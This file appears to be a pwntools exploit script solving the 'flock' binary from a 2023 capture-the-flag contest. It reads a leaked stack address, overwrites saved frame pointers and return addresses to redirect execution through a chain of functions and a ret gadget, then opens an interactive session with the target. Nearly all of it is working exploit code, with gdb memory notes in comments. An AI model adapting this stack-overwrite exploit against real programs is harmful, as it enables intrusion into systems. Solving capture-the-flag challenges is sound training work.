from pwn import *

# buffer: 0x00007fffffffe270
# 0x7fffffffe2f8 - 0x7fffffffe318  →   "\x76\x12\x40\x00\x00\x00\x00\x00[...]"
# 0x7fffffffe318 - 0x7fffffffe338  →   "\xa0\x12\x40\x00\x00\x00\x00\x00[...]"
# 0x7fffffffe338 - 0x7fffffffe358  →   "\xca\x12\x40\x00\x00\x00\x00\x00[...]"
# 0x7fffffffe358 - 0x7fffffffe378  →   "\xf0\x12\x40\x00\x00\x00\x00\x00[...]"

# backtrace
#0  0x0000000000401250 in func5 ()
#1  0x0000000000401276 in func4 ()
#2  0x00000000004012a0 in func3 ()
#3  0x00000000004012ca in func2 ()
#4  0x00000000004012f0 in func1 ()
#5  0x0000000000401554 in main ()

if args.REMOTE:
    io = remote('chal.2023.sunshinectf.games', 23002)
else:
    io = process('./flock')

payload = b''

io.recvuntil(b'Song Begins At 0x')
buf_addr = int(io.recvline(), 16)

ret_addr_locations = [
    0x7fffffffe2f8,
    0x7fffffffe318,
    0x7fffffffe338,
    0x7fffffffe358
]
buffer_address = 0x00007fffffffe270

offsets = [x - buffer_address for x in ret_addr_locations]
print(offsets)

ret_addrs = [
    0x0000000000401276,
    0x00000000004012a0,
    0x00000000004012ca,
    0x00000000004012f0
]

d = {}
for i, j in zip(offsets, ret_addrs):
    d[i] = p64(j)
    d[i - 0x8] = p64(buf_addr + i + 0x18)

d[offsets[-1] + 0x10] = p64(0x401292) # just a ret gadget for stack alignment
d[offsets[-1] + 0x18] = p64(0x4011b9)

payload = flat(d)

print(payload)

# with open('payload', 'wb') as f:
#     f.write(payload)



pause()
io.sendafter(b'>>> ', payload)
io.interactive()
